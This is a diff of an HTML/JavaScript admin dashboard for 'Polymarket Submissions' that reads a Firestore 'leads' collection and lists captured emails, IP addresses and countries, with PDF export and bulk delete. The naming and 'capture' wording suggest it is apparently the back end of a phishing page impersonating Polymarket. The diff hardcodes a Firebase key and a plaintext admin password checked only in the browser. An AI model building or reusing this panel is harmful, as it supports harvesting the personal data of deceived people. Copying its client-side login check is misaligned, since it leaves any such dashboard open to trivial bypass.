@@ -12,101 +12,175 @@
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
     body { font-family: 'Inter', sans-serif; background-color: #020617; }
     .glass { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.05); }
+    #loginOverlay { transition: opacity 0.5s ease; }
   </style>
 </head>
 <body class="text-slate-200 min-h-screen pb-20">
 
-<div class="max-w-6xl mx-auto px-4 pt-10">
-  <div class="flex flex-col md:flex-row md:items-center justify-between gap-6 mb-10">
-    <div>
-      <h1 class="text-3xl font-bold tracking-tight text-white flex items-center gap-3">
-        <i data-lucide="shield-check" class="text-emerald-500 w-8 h-8"></i>
-        Admin Dashboard
-      </h1>
-      <p class="text-slate-500 mt-1">Intelligence management for Polymarket Submissions</p>
+<div id="loginOverlay" class="fixed inset-0 z-[100] bg-slate-950 flex items-center justify-center p-4">
+    <div class="glass max-w-sm w-full p-8 rounded-3xl border border-slate-800 shadow-2xl">
+        <div class="text-center mb-8">
+            <div class="w-16 h-16 bg-emerald-500/10 rounded-2xl flex items-center justify-center mx-auto mb-4 border border-emerald-500/20">
+                <i data-lucide="lock" class="text-emerald-500 w-8 h-8"></i>
+            </div>
+            <h2 class="text-2xl font-bold text-white">Admin Access</h2>
+            <p class="text-slate-500 text-sm mt-2">Please enter credentials to continue</p>
+        </div>
+        
+        <div class="space-y-4">
+            <div>
+                <label class="text-xs font-bold uppercase tracking-widest text-slate-500 ml-1">Username</label>
+                <input type="text" id="userIn" class="w-full bg-slate-900 border border-slate-800 rounded-xl px-4 py-3 mt-1 focus:outline-none focus:border-emerald-500 transition-colors" placeholder="user">
+            </div>
+            <div>
+                <label class="text-xs font-bold uppercase tracking-widest text-slate-500 ml-1">Password</label>
+                <input type="password" id="passIn" class="w-full bg-slate-900 border border-slate-800 rounded-xl px-4 py-3 mt-1 focus:outline-none focus:border-emerald-500 transition-colors" placeholder="••••••••">
+            </div>
+            <button id="btnLogin" onclick="checkAuth()" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-4 rounded-xl mt-4 transition-all shadow-lg shadow-emerald-900/20">
+                Sign In
+            </button>
+            <p id="loginError" class="text-red-400 text-xs text-center font-semibold mt-2 hidden"></p>
+        </div>
     </div>
-    <div class="flex items-center gap-3">
-      <button onclick="downloadPDF()" class="flex items-center gap-2 bg-slate-800 hover:bg-slate-700 text-white px-5 py-2.5 rounded-xl font-semibold transition-all border border-slate-700">
-        <i data-lucide="download" class="w-4 h-4 text-emerald-400"></i> Export PDF
-      </button>
-      <button onclick="deleteAll()" class="flex items-center gap-2 bg-red-500/10 hover:bg-red-500 text-red-500 hover:text-white px-5 py-2.5 rounded-xl font-semibold transition-all border border-red-500/20">
-        <i data-lucide="trash-2" class="w-4 h-4"></i> Delete All
-      </button>
-    </div>
-  </div>
-
-  <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-10">
-    <div class="glass p-6 rounded-2xl">
-      <p class="text-slate-500 text-sm font-semibold uppercase tracking-wider">Total Captures</p>
-      <h2 id="totalCaptures" class="text-4xl font-bold text-white mt-2">0</h2>
-    </div>
-    <div class="glass p-6 rounded-2xl border-l-4 border-l-emerald-500">
-      <p class="text-slate-500 text-sm font-semibold uppercase tracking-wider">Database Status</p>
-      <h2 class="text-xl font-bold text-emerald-400 mt-2">Live & Active</h2>
-    </div>
-    <div class="glass p-6 rounded-2xl">
-      <p class="text-slate-500 text-sm font-semibold uppercase tracking-wider">Storage File</p>
-      <h2 class="text-xl font-bold text-slate-300 mt-2">submissions.txt</h2>
-    </div>
-  </div>
-
-  <div class="glass rounded-3xl overflow-hidden">
-    <div class="p-6 border-b border-slate-800 flex items-center justify-between">
-      <h3 class="font-bold text-lg">Recent Submissions</h3>
-      <button onclick="fetchSubmissions()" class="text-emerald-500 hover:text-emerald-400 text-sm font-bold flex items-center gap-2">
-        <i data-lucide="refresh-cw" class="w-4 h-4"></i> Refresh
-      </button>
-    </div>
-    <div class="overflow-x-auto">
-      <table id="logsTable" class="w-full text-left">
-        <thead class="bg-slate-900/50 text-slate-500 text-xs uppercase font-bold tracking-widest">
-          <tr>
-            <th class="py-5 px-8">Captured At</th>
-            <th class="py-5 px-8">Country</th>
-            <th class="py-5 px-8">Email Address</th>
-          </tr>
-        </thead>
-        <tbody class="divide-y divide-slate-800">
-          <!-- Logs injected by JS -->
-        </tbody>
-      </table>
-    </div>
-  </div>
 </div>
 
-<!-- Firebase + Custom Script -->
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js";
-  import { getFirestore, collection, getDocs, deleteDoc, query, orderBy } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-firestore.js";
+<div id="mainContent" class="hidden opacity-0 transition-opacity duration-1000">
+    <div class="max-w-6xl mx-auto px-4 pt-10">
+      <div class="flex flex-col md:flex-row md:items-center justify-between gap-6 mb-10">
+        <div>
+          <h1 class="text-3xl font-bold tracking-tight text-white flex items-center gap-3">
+            <i data-lucide="shield-check" class="text-emerald-500 w-8 h-8"></i>
+            Admin Dashboard
+          </h1>
+          <p class="text-slate-500 mt-1">Intelligence management for Polymarket Submissions</p>
+        </div>
+        <div class="flex items-center gap-3">
+          <button id="btnPDF" class="flex items-center gap-2 bg-slate-800 hover:bg-slate-700 text-white px-5 py-2.5 rounded-xl font-semibold transition-all border border-slate-700">
+            <i data-lucide="download" class="w-4 h-4 text-emerald-400"></i> Export PDF
+          </button>
+          <button id="btnDeleteAll" class="flex items-center gap-2 bg-red-500/10 hover:bg-red-500 text-red-500 hover:text-white px-5 py-2.5 rounded-xl font-semibold transition-all border border-red-500/20">
+            <i data-lucide="trash-2" class="w-4 h-4"></i> Delete All
+          </button>
+        </div>
+      </div>
 
-// For Firebase JS SDK v7.20.0 and later, measurementId is optional
-const firebaseConfig = {
-  apiKey: "AIzaSyDWfxoyZBG0_C2zh1oOK7Hk61msN4qVt0Q",
-  authDomain: "polymarket-b7224.firebaseapp.com",
-  projectId: "polymarket-b7224",
-  storageBucket: "polymarket-b7224.firebasestorage.app",
-  messagingSenderId: "525262934259",
-  appId: "1:525262934259:web:fda3646657fc8b1ec26786",
-  measurementId: "G-L4H1P4HCCM"
-};
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-10">
+        <div class="glass p-6 rounded-2xl">
+          <p class="text-slate-500 text-sm font-semibold uppercase tracking-wider">Total Captures</p>
+          <h2 id="totalCaptures" class="text-4xl font-bold text-white mt-2">0</h2>
+        </div>
+        <div class="glass p-6 rounded-2xl border-l-4 border-l-emerald-500">
+          <p class="text-slate-500 text-sm font-semibold uppercase tracking-wider">Database Status</p>
+          <h2 class="text-xl font-bold text-emerald-400 mt-2">Live & Active</h2>
+        </div>
+        <div class="glass p-6 rounded-2xl">
+          <p class="text-slate-500 text-sm font-semibold uppercase tracking-wider">Collection</p>
+          <h2 class="text-xl font-bold text-slate-300 mt-2">leads</h2>
+        </div>
+      </div>
+
+      <div class="glass rounded-3xl overflow-hidden">
+        <div class="p-6 border-b border-slate-800 flex items-center justify-between">
+          <h3 class="font-bold text-lg">Recent Submissions</h3>
+          <button id="btnRefresh" class="text-emerald-500 hover:text-emerald-400 text-sm font-bold flex items-center gap-2">
+            <i data-lucide="refresh-cw" class="w-4 h-4"></i> Refresh
+          </button>
+        </div>
+        <div class="overflow-x-auto">
+          <table id="logsTable" class="w-full text-left">
+            <thead class="bg-slate-900/50 text-slate-500 text-xs uppercase font-bold tracking-widest">
+              <tr>
+                <th class="py-5 px-8">Captured At</th>
+                <th class="py-5 px-8">Country</th>
+                <th class="py-5 px-8">IP Address</th>
+                <th class="py-5 px-8">Email Address</th>
+              </tr>
+            </thead>
+            <tbody class="divide-y divide-slate-800"></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+  import { getFirestore, collection, getDocs, deleteDoc, query, orderBy, doc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyDWfxoyZBG0_C2zh1oOK7Hk61msN4qVt0Q",
+    authDomain: "polymarket-b7224.firebaseapp.com",
+    projectId: "polymarket-b7224",
+    storageBucket: "polymarket-b7224.firebasestorage.app",
+    messagingSenderId: "525262934259",
+    appId: "1:525262934259:web:fda3646657fc8b1ec26786",
+    measurementId: "G-L4H1P4HCCM"
+  };
 
   const app = initializeApp(firebaseConfig);
   const db = getFirestore(app);
 
   lucide.createIcons();
 
+  // --- AUTH LOGIC ---
+  let attempts = 0;
+  window.checkAuth = function() {
+      const user = document.getElementById('userIn').value;
+      const pass = document.getElementById('passIn').value;
+      const err = document.getElementById('loginError');
+      const btn = document.getElementById('btnLogin');
+
+      if (user === "admin" && pass === "Tobi1234") {
+          sessionStorage.setItem('admin_auth', 'true');
+          unlockDashboard();
+      } else {
+          attempts++;
+          err.classList.remove('hidden');
+          err.innerText = `Invalid credentials. Attempt ${attempts}/5`;
+          
+          if (attempts >= 5) {
+              btn.disabled = true;
+              btn.innerText = "Locked";
+              btn.classList.replace('bg-emerald-600', 'bg-red-900/50');
+              err.innerText = "Too many failed attempts. Refresh page to try again.";
+          }
+      }
+  }
+
+  function unlockDashboard() {
+      document.getElementById('loginOverlay').classList.add('hidden');
+      const content = document.getElementById('mainContent');
+      content.classList.remove('hidden');
+      setTimeout(() => content.classList.add('opacity-100'), 10);
+      fetchSubmissions();
+  }
+
+  // Check if already logged in for this session
+  if (sessionStorage.getItem('admin_auth') === 'true') {
+      unlockDashboard();
+  }
+
+  // --- DASHBOARD LOGIC ---
   let submissions = [];
 
   async function fetchSubmissions() {
+    if (sessionStorage.getItem('admin_auth') !== 'true') return;
+    
     submissions = [];
+    const tbody = document.querySelector("#logsTable tbody");
+    tbody.innerHTML = `<tr><td colspan="4" class="py-20 text-center text-slate-400">Fetching intelligence...</td></tr>`;
+
     try {
-      const q = query(collection(db, "submissions"), orderBy("dateTime", "desc"));
+      const q = query(collection(db, "leads"), orderBy("time", "desc"));
       const querySnapshot = await getDocs(q);
-      querySnapshot.forEach((doc) => {
-        const data = doc.data();
+      
+      querySnapshot.forEach((docSnap) => {
+        const data = docSnap.data();
         submissions.push({
-          dateTime: data.dateTime?.seconds ? new Date(data.dateTime.seconds * 1000).toLocaleString() : "-",
-          country: data.country || "Unknown",
+          id: docSnap.id,
+          dateTime: data.time?.seconds ? new Date(data.time.seconds * 1000).toLocaleString() : new Date(data.time).toLocaleString(),
+          country: data.country || data.country_name || "Unknown",
+          ip: data.ip || "0.0.0.0",
           email: data.email || "-"
         });
       });
@@ -120,16 +194,23 @@ const firebaseConfig = {
     const tbody = document.querySelector("#logsTable tbody");
     tbody.innerHTML = "";
     document.getElementById("totalCaptures").innerText = submissions.length;
+    
     if(submissions.length === 0) {
-      tbody.innerHTML = `<tr><td colspan="3" class="py-20 text-center text-slate-600 italic">No data available in the logs.</td></tr>`;
+      tbody.innerHTML = `<tr><td colspan="4" class="py-20 text-center text-slate-600 italic">No logs found in the "leads" collection.</td></tr>`;
       return;
     }
+
     submissions.forEach(entry => {
       const tr = document.createElement("tr");
       tr.classList.add("hover:bg-white/[0.02]", "transition-colors");
       tr.innerHTML = `
         <td class="py-5 px-8 font-mono text-xs text-slate-400">${entry.dateTime}</td>
-        <td class="py-5 px-8"><span class="bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 px-3 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider">${entry.country}</span></td>
+        <td class="py-5 px-8">
+            <span class="bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 px-3 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider">
+                ${entry.country}
+            </span>
+        </td>
+        <td class="py-5 px-8 font-mono text-xs text-slate-500">${entry.ip}</td>
         <td class="py-5 px-8 font-semibold text-slate-100">${entry.email}</td>
       `;
       tbody.appendChild(tr);
@@ -137,41 +218,38 @@ const firebaseConfig = {
   }
 
   async function deleteAll() {
-    if(confirm("Are you sure you want to permanently delete all submissions? This cannot be undone.")) {
+    if(confirm("Are you sure you want to permanently delete all submissions?")) {
       try {
-        const q = query(collection(db, "submissions"));
-        const querySnapshot = await getDocs(q);
-        for (const docSnap of querySnapshot.docs) {
-          await deleteDoc(docSnap.ref);
-        }
+        const querySnapshot = await getDocs(collection(db, "leads"));
+        const deletePromises = querySnapshot.docs.map(docSnap => deleteDoc(doc(db, "leads", docSnap.id)));
+        await Promise.all(deletePromises);
+        alert("Database cleared.");
+        await fetchSubmissions();
       } catch (error) {
         console.error("Error deleting submissions:", error);
       }
-      await fetchSubmissions();
     }
   }
 
-  async function downloadPDF() {
+  function downloadPDF() {
     const { jsPDF } = window.jspdf;
     const doc = new jsPDF();
     doc.setFontSize(18);
     doc.text("Polymarket Submission Logs", 14, 22);
-    doc.setFontSize(11);
-    doc.setTextColor(100);
-    doc.text("Exported on: " + new Date().toLocaleString(), 14, 30);
     doc.autoTable({
-      head: [['Captured At', 'Country', 'Email']],
-      body: submissions.map(e => [e.dateTime, e.country, e.email]),
+      head: [['Captured At', 'Country', 'IP', 'Email']],
+      body: submissions.map(e => [e.dateTime, e.country, e.ip, e.email]),
       startY: 40,
       theme: 'striped',
       headStyles: { fillColor: [16, 185, 129] },
-      styles: { fontSize: 9 }
+      styles: { fontSize: 8 }
     });
-    doc.save("submissions_report_" + Date.now() + ".pdf");
+    doc.save("polymarket_leads_" + Date.now() + ".pdf");
   }
 
-  // Initial fetch from Firebase
-  fetchSubmissions();
+  document.getElementById("btnRefresh").addEventListener("click", fetchSubmissions);
+  document.getElementById("btnDeleteAll").addEventListener("click", deleteAll);
+  document.getElementById("btnPDF").addEventListener("click", downloadPDF);
 </script>
 
 </body>
